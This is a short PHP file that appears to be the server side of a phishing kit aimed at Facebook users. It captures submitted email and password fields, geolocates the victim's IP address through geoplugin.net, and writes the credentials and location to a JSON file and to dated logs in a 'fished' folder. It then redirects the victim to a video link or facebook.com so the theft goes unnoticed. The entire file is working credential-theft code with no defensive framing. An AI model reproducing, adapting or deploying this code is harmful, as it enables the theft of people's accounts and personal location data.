<?php
$usuarios =json_decode( file_get_contents('usernames.json'), true);


function get_data() {
    if ($_SERVER['HTTP_CLIENT_IP'])
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if($_SERVER['HTTP_X_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if($_SERVER['HTTP_X_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if($_SERVER['HTTP_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if($_SERVER['HTTP_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if($_SERVER['REMOTE_ADDR'])
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'DESCONOCIDO';

    $response = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ipaddress));
    $data = [
        'ip' => $response['geoplugin_request'],
        'continent' =>  $response ['geoplugin_continentName'],
        'country' =>  $response ['geoplugin_countryName'],
        'province' =>  $response ['geoplugin_regionName'],
        'district' => $response['geoplugin_city'],
        'geolocation'  => [
            'latitude' => $response['geoplugin_latitude'],
            'longitude' => $response['geoplugin_longitude'],
        ]
    ];

    return $data;
};


$usuario = [
    'id' => hash('CRC32', date(DATE_ATOM)),
    'date' => date(DATE_ATOM),
    'client' =>  get_data(),
    'username' => [
        'email'=> $_POST['email'],
        'pass' => $_POST['pass']
    ],
];

array_push($usuarios,$usuario);

file_put_contents("usernames.json", json_encode($usuarios , JSON_PRETTY_PRINT) );

file_put_contents('fished/' . date('Y-m-d') . '.txt', json_encode($usuario) . "\n----\n", FILE_APPEND | LOCK_EX);

$urls = json_decode(file_get_contents( 'admin/php/url.json'), true);


if(array_key_exists($_POST['video'], $urls )) {
    $url  = $urls[$_POST['video']];
    header('Location: '.$url);
} else {
    header('Location: https://facebook.com');
}

exit();
?>
